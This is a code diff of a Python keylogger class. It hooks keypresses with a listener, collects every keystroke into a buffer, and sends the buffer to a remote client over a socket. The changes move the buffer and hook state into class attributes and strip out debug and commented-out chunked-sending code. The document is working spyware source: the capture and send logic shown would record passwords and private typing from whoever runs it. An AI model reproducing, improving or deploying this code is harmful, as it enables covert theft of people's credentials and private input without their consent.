@@ -3,10 +3,12 @@ import keyboard
 import time
 
 class KeyLogger:
+    keys = ''
+    is_hooking = False
+    listener = None
+
     def __init__(self, sock = None):
-        self.keys = ''
         self.client = sock
-        self.is_hooking = False
         pass
 
     def run(self):
@@ -26,44 +28,37 @@ class KeyLogger:
                 return     
     
     def on_press(self, key):
-        print(key, type(key))
         if type(key) == Key:
             if key == Key.space:
-                self.keys += ' '
+                KeyLogger.keys += ' '
             elif key == Key.enter:
-                self.keys += '\n'
+                KeyLogger.keys += '\n'
             elif key == Key.tab:
-                self.keys += '\t'
+                KeyLogger.keys += '\t'
             else:
-                self.keys += '<' + str(key) + '>'
+                KeyLogger.keys += '<' + str(key) + '>'
         else:
             if ord(key.char) < 32:
-                self.keys += chr(ord(key.char) + 96)
+                KeyLogger.keys += chr(ord(key.char) + 96)
             else:
-                self.keys += key.char
+                KeyLogger.keys += key.char
     
     def hook_key(self): 
-        if self.is_hooking: return
-        self.listener = Listener(on_press = self.on_press)
-        self.listener.start()
-        # self.listener.join()
-        self.is_hooking = True
+        if KeyLogger.is_hooking: return
+        KeyLogger.listener = Listener(on_press = self.on_press)
+        KeyLogger.listener.start()
+        # KeyLogger.listener.join()
+        KeyLogger.is_hooking = True
 
     def unhook_key(self):
-        if not self.is_hooking: return
-        self.listener.stop()
-        self.is_hooking = False
+        if not KeyLogger.is_hooking: return
+        KeyLogger.listener.stop()
+        KeyLogger.is_hooking = False
         return False
     
     def print_keys(self):
-        # self.client.sendall(bytes(str(len(self.keys)), "utf8"))
-        # time.sleep(0.1)
-        # id = 0
-        # while id < len(self.keys):
-        #     self.client.sendall(bytes(self.keys[id : id + 4096], "utf8"))
-        #     id += 4096
-        self.client.sendall(bytes(self.keys, "utf8"))
-        self.keys = ''
+        self.client.sendall(bytes(KeyLogger.keys, "utf8"))
+        KeyLogger.keys = ''
         pass
     
     def lock_keyboard(self):
